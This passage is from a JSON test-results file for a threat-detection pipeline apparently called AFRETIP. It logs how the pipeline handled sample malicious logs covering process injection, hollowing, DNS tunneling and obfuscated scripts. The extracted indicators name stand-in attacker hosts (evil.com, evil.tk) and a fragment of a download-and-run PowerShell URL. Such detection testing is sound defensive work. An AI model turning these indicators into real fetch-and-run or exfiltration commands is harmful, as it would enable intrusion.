iocs_found=7 log_hash=311ed2cd61c14ddfb2829e25393919e9\n2025-08-18 20:06:31 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 20:06:31 [debug    ] VirusTotal rate limiting       sleep_time=13.93155813217163\n2025-08-18 20:06:46 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=domain ioc_value=System.Diagnostics.Process threat_level=medium\n2025-08-18 20:06:46 [debug    ] VirusTotal rate limiting       sleep_time=13.959426164627075\n2025-08-18 20:07:01 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=domain ioc_value=proc.Handle threat_level=medium\n2025-08-18 20:07:01 [debug    ] VirusTotal rate limiting       sleep_time=13.959832191467285\n2025-08-18 20:07:16 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=domain ioc_value=injector.exe threat_level=medium\n2025-08-18 20:07:16 [debug    ] VirusTotal rate limiting       sleep_time=14.084852695465088\n2025-08-18 20:07:30 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:07:30 [info     ] Threat detected                classification=suspicious confidence=0.8 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe threat_level=medium\n2025-08-18 20:07:30 [debug    ] VirusTotal rate limiting       sleep_time=14.997856616973877\n2025-08-18 20:07:45 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:07:45 [info     ] Threat detected                classification=suspicious confidence=0.8 ioc_type=file_path ioc_value=C:\\\\temp\\\\injector.exe threat_level=medium\n2025-08-18 20:07:45 [debug    ] VirusTotal rate limiting       sleep_time=14.99815845489502\n2025-08-18 20:08:00 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:08:00 [info     ] Threat detected                classification=suspicious confidence=0.65 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=51da09ecdc3148bf8434a15d7ec5e2ae new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=29c524b5db7848a29e629358c35931b7 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=2c4a5b1809c8462d8a935f32960eea91 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=cc28abed62d2479ab12e0225c482bc10 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=69af471ae5fc4d14b395c53db1478344 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=94354b9b74734f41b45ef327b2f4d711 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:08:00 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=b49e3a6f76ec4241a29dd6cdcb180542 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 7\n  \u2022 Findings generated: 7\n  \u2022 Rules generated: 7\n  \u2022 Processing time: 90.081s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: System.Diagnostics.Process (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: proc.Handle (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: injector.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "inj_02_process_hollowing.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:09:16.169716",
      "processing_time": 75.41151404380798,
      "success": true,
      "metrics": {
        "iocs_extracted": 6,
        "findings_generated": 6,
        "rules_generated": 6,
        "ioc_extraction_time": 75.075,
        "threat_classifications": {
          "suspicious": 4,
          "malicious": 2
        },
        "confidence_scores": [
          0.6,
          0.6,
          1.0,
          1.0,
          0.75,
          0.75
        ],
        "threat_levels": {
          "medium": 4,
          "high": 2
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.129999999999999,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:08:01 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/process_injection/inj_02_process_hollowing.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:08:01 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:08:01 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:08:01 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:08:01 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:08:01 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:08:01 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:08:01 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:08:01 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:08:01 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:08:01 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:08:01 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:08:01 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:08:01 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:08:01 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:08:01 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:08:01 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:08:01 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:08:01 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:08:01 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:08:01 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:08:01 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:08:01 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:08:01 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:08:01 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:08:01 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:08:01 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:08:01 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:08:01 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_200801\n2025-08-18 20:08:01 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:08:01 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:08:01 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=6 log_hash=d336a7dc2b69406abb9a3d67f7c9b201\n2025-08-18 20:08:01 [info     ] Threat detected                classification=suspicious confidence=0.6 ioc_type=domain ioc_value=svchost.exe threat_level=medium\n2025-08-18 20:08:01 [debug    ] VirusTotal rate limiting       sleep_time=14.346649408340454\n2025-08-18 20:08:16 [info     ] Threat detected                classification=suspicious confidence=0.6 ioc_type=domain ioc_value=hollow.exe threat_level=medium\n2025-08-18 20:08:16 [debug    ] VirusTotal rate limiting       sleep_time=14.394728899002075\n2025-08-18 20:08:31 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=hash_md5 ioc_value=C7B5FB1DFA5C354A97003BE796788BA9 threat_level=high\n2025-08-18 20:08:31 [debug    ] VirusTotal rate limiting       sleep_time=14.267427921295166\n2025-08-18 20:08:46 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=hash_sha256 ioc_value=526C9879194F32DBDFD6DBC18323B7173426F264FADE2D9ED7C77AA2024ADFC6 threat_level=high\n2025-08-18 20:08:46 [debug    ] VirusTotal rate limiting       sleep_time=14.224038362503052\n2025-08-18 20:09:01 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:09:01 [info     ] Threat detected                classification=suspicious confidence=0.75 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\svchost.exe threat_level=medium\n2025-08-18 20:09:01 [debug    ] VirusTotal rate limiting       sleep_time=14.999449729919434\n2025-08-18 20:09:16 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:09:16 [info     ] Threat detected                classification=suspicious confidence=0.75 ioc_type=file_path ioc_value=C:\\\\temp\\\\hollow.exe threat_level=medium\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a5bd1a7c30524a4f95635b40d5ae40b8 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5dca5347c32b4d26916455f417a39179 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5610b057cf8a49febeeb6047fcf2341a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=afe0bc3ec113434cb979b0e398f198a0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f06e820a44294a85aa9ac6b932ed4ef1 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:09:16 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=87df84158b694bc5a600e4313527d0de new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 6\n  \u2022 Findings generated: 6\n  \u2022 Rules generated: 6\n  \u2022 Processing time: 75.075s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: svchost.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: hollow.exe (confidence: 0.50)\n  \u2022 IOCType.HASH_MD5: C7B5FB1DFA5C354A97003BE796788BA9 (confidence: 0.90)\n  \u2022 IOCType.HASH_SHA256: 526C9879194F32DBDFD6DBC18323B7173426F264FADE2D9ED7C77AA2024ADFC6 (confidence: 0.90)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\svchost.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "exf_01_dns_tunneling.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:10:31.617367",
      "processing_time": 75.44714403152466,
      "success": true,
      "metrics": {
        "iocs_extracted": 6,
        "findings_generated": 6,
        "rules_generated": 4,
        "ioc_extraction_time": 75.073,
        "threat_classifications": {
          "malicious": 6
        },
        "confidence_scores": [
          0.75,
          0.9500000000000001,
          0.9500000000000001,
          0.9500000000000001,
          0.9500000000000001,
          0.9500000000000001
        ],
        "threat_levels": {
          "high": 6
        },
        "rule_generation_efficiency": 0.6666666666666666
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:09:16 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/data_exfiltration/exf_01_dns_tunneling.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:09:16 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:09:16 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:09:16 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:09:16 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:09:16 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:09:16 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:09:16 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:09:16 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:09:16 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:09:16 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:09:16 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:09:16 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:09:16 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:09:16 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:09:16 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:09:16 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:09:16 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:09:16 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:09:16 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:09:16 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:09:16 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:09:16 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:09:16 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:09:16 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:09:16 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:09:16 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:09:16 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:09:16 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_200916\n2025-08-18 20:09:16 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:09:16 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:09:16 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=6 log_hash=db8893e31cf54da0995b7a2ddf3eeb2b\n2025-08-18 20:09:18 [info     ] Threat detected                classification=malicious confidence=0.75 ioc_type=ip ioc_value=192.168.1.150 threat_level=high\n2025-08-18 20:09:18 [debug    ] VirusTotal rate limiting       sleep_time=12.584931373596191\n2025-08-18 20:09:33 [info     ] Threat detected                classification=malicious confidence=0.9500000000000001 ioc_type=domain ioc_value=c3NzaXRpdmVkYXRh.c2.evil.com threat_level=high\n2025-08-18 20:09:33 [debug    ] VirusTotal rate limiting       sleep_time=13.429019212722778\n2025-08-18 20:09:47 [info     ] Threat detected                classification=malicious confidence=0.9500000000000001 ioc_type=domain ioc_value=nslookup.exe threat_level=high\n2025-08-18 20:09:47 [debug    ] VirusTotal rate limiting       sleep_time=13.904531955718994\n2025-08-18 20:10:03 [info     ] Threat detected                classification=malicious confidence=0.9500000000000001 ioc_type=domain ioc_value=exfil.exe threat_level=high\n2025-08-18 20:10:03 [debug    ] VirusTotal rate limiting       sleep_time=12.742236852645874\n2025-08-18 20:10:16 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:10:16 [info     ] Threat detected                classification=malicious confidence=0.9500000000000001 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\nslookup.exe threat_level=high\n2025-08-18 20:10:16 [debug    ] VirusTotal rate limiting       sleep_time=14.999457597732544\n2025-08-18 20:10:31 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:10:31 [info     ] Threat detected                classification=malicious confidence=0.9500000000000001 ioc_type=file_path ioc_value=C:\\\\temp\\\\exfil.exe threat_level=high\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=baaa337bab8a4ca785ddae29f991c51b new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=947e606fe27542168f96082e75bb6d80 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=5617baaa62784e539856121fdf9e30f6 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=11d9a641860e45a08525ea3b07fd9482 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=415b767988564c9db73e14f1270be1b5 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:10:31 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=9b2692739b9f41219a11e15010102daf new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 6\n  \u2022 Findings generated: 6\n  \u2022 Rules generated: 4\n  \u2022 Processing time: 75.073s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.150 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: c3NzaXRpdmVkYXRh.c2.evil.com (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: nslookup.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: exfil.exe (confidence: 0.70)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\nslookup.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "eva_01_obfuscated_script.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:13:02.228781",
      "processing_time": 150.6108100414276,
      "success": true,
      "metrics": {
        "iocs_extracted": 11,
        "findings_generated": 11,
        "rules_generated": 8,
        "ioc_extraction_time": 150.169,
        "threat_classifications": {
          "suspicious": 6,
          "malicious": 5
        },
        "confidence_scores": [
          0.8,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0,
          1.0
        ],
        "threat_levels": {
          "medium": 6,
          "high": 5
        },
        "rule_generation_efficiency": 0.7272727272727273
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 27.11,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 20:10:31 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/evasion_techniques/eva_01_obfuscated_script.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 20:10:31 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 20:10:31 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:10:31 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:10:31 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:10:31 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:10:31 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:10:31 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:10:31 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:10:31 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:10:31 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:10:31 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:10:31 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:10:31 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:10:31 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:10:31 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 20:10:31 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 20:10:31 [info     ] Threat intelligence database schema initialized\n2025-08-18 20:10:31 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 20:10:31 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 20:10:31 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 20:10:31 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 20:10:31 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 20:10:31 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 20:10:31 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:10:31 [info     ] Parsing existing rules from: data/rules\n2025-08-18 20:10:31 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 20:10:31 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 20:10:31 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_201031\n2025-08-18 20:10:31 [info     ] Analytics metrics enabled for data collection\n2025-08-18 20:10:31 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 20:10:31 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=11 log_hash=c79041274e754393aebef7e51ee500f4\n2025-08-18 20:10:33 [info     ] Threat detected                classification=suspicious confidence=0.8 ioc_type=ip ioc_value=192.168.1.100 threat_level=medium\n2025-08-18 20:10:33 [debug    ] VirusTotal rate limiting       sleep_time=13.389905452728271\n2025-08-18 20:10:47 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 20:10:47 [debug    ] VirusTotal rate limiting       sleep_time=14.334777593612671\n2025-08-18 20:11:02 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=Net.WebC threat_level=medium\n2025-08-18 20:11:02 [debug    ] VirusTotal rate limiting       sleep_time=14.407147407531738\n2025-08-18 20:11:17 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=domain ioc_value=evil.tk threat_level=high\n2025-08-18 20:11:17 [debug    ] VirusTotal rate limiting       sleep_time=14.189788103103638\n2025-08-18 20:11:32 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=domain ioc_value=cmd.exe threat_level=medium\n2025-08-18 20:11:32 [debug    ] VirusTotal rate limiting       sleep_time=14.41148042678833\n2025-08-18 20:11:47 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=url ioc_value=\"http://evil.tk/p.ps1')\" threat_level=high\n2025-08-18 20:11:47 [debug    ] VirusTotal rate limiting       sleep_time=14.31668472290039\n2025-08-18 20:12:02 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:12:02 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=//evil.tk/p.ps1 threat_level=high\n2025-08-18 20:12:02 [debug    ] VirusTotal rate limiting       sleep_time=14.999268293380737\n2025-08-18 20:12:17 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:12:17 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe threat_level=high\n2025-08-18 20:12:17 [debug    ] VirusTotal rate limiting       sleep_time=14.998341798782349\n2025-08-18 20:12:32 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 20:12:32 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\cmd.exe threat_level=high\n2025-08-18 20:12:32 [debug    ] VirusTotal rate limiting       sleep_time=14.99807071685791\n2025-08-18 20:12:47 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:12:47 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 20:12:47 [debug    ] VirusTotal rate limiting       sleep_time=14.99832010269165\n2025-08-18 20:13:02 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 20:13:02 [info     ] Threat detected                classification=suspicious confidence=1.0 ioc_type=process_name ioc_value=cmd.exe threat_level=medium\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=65e5530ac7504f10a71b107dc80e9967 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f2adac524c77481ebe741041e1c7dbca new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=7c8d1a729159426f9732488797dc43d9 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=0f63ff73377844f8a5c1be681de76831 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a0eaa79755f24a688b1fad3db3ed53c7 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=68d2f7cc068a4145b138d45f67171705 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=94d55f1f79364843b178b85c6ea3d9e8 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=141d94bec6a14464870696a0da87b60b new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=a12495dd14f747b9bad35220dd8bf1b9 new_rules_generated=0 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=46f17fa01d15432c9f172458aac4c494 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 20:13:02 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=bedf315655af4aab8a35eac46dedfa1a new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 11\n  \u2022 Findings generated: 11\n  \u2022 Rules generated: 8\n  \u2022 Processing time: 150.169s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.IP: 192.168.1.100 (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: Net.WebC (confidence: 0.70)\n  \u2022 IOCType.DOMAIN: evil.tk (confidence: 1.00)\n  \u2022 IOCType.DOMAIN: cmd.exe (confidence: 0.70)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "lat_01_psexec.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T20:13:02.658352",
      "processing_time": 0.42123842239379883,
      "success": true,
      "metrics": {
        "iocs_extracted": 1,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 0.001,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
